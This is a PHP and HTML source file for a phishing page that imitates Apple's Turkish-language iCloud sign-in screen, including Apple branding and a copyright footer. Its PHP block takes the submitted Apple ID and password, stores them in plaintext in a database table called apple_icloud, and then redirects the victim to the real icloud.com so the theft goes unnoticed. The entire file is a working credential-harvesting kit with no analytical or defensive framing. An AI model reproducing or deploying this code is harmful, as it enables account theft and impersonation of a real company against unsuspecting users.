<?php 
include("vtconn.php");

if (isset($_POST["AppleButton"])) {
    if (empty($_POST["AppleUsername"]) || empty($_POST["ApplePassword"])) {

    } else {

        $AppleUsername = $_POST["AppleUsername"];
        $ApplePassword = $_POST["ApplePassword"];

        $apple_sql = "INSERT INTO apple_icloud (icloud_username, icloud_password) VALUES (?, ?)";


        if ($stmt = mysqli_prepare($vtconn, $apple_sql)) {

            mysqli_stmt_bind_param($stmt, "ss", $AppleUsername, $ApplePassword);
            
 
            mysqli_stmt_execute($stmt);
            
            header("Refresh: 1.5; URL=https://www.icloud.com/");
            exit();
        } 
        mysqli_close($vtconn);
    }
}
?>
 


<!DOCTYPE html>
<html lang="tr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
    <link rel="icon" href="imgs/apple.ico">
    <link rel="stylesheet" href="style.css">
    <title>iCloud</title>
</head>

<body>
    <header>
        <nav>
            <a href="index.php" class="icloud-logo"><i class='bx bxl-apple'></i>iCloud</a>
        </nav>
    </header>
    <main id="main">
        <form id="sign-in" action="index.php" method="POST"> 
            <img id="apple-color-logo" src="imgs/sign-in-screen-img.svg" alt="">
            <p>Apple Hesabı ile giriş yapın</p>
                <div class="input-container">
                <input id="email-phone" name="AppleUsername" type="email" placeholder="E-Posta veya Telefon Numarası" title="Gerekli alanı doldurun">
                </div>

                <div class="input-container">
                <button type="submit" name="AppleButton">
                <i class='bx bx-right-arrow-circle'></i>
                </button>  
                <input id="password" name="ApplePassword" type="password" placeholder="Parola" title="Gerekli alanı doldurun">
                </div>

            <label><input type="checkbox" id="check">Oturum açık kalsın</label>
            <div class="links"> <a href="https://iforgot.apple.com/password/verify/appleid">Parolayı mı unuttunuz?</a>
            <a href="https://support.apple.com/tr-tr/108647">Apple hesabı oluştur</a></div>
        </form>
    </main>
    <footer>
        <div class="footer-div">Sistem Durumu
            <div class="sep"></div>
            Gizlilik Politikası
            <div class="sep"></div>
            Hüküm ve Koşullar
        </div>
        <div class="footer-div">Copyright © 2025 Apple Inc. Tüm haklar saklıdır.</div>
    </footer>
</body>

</html>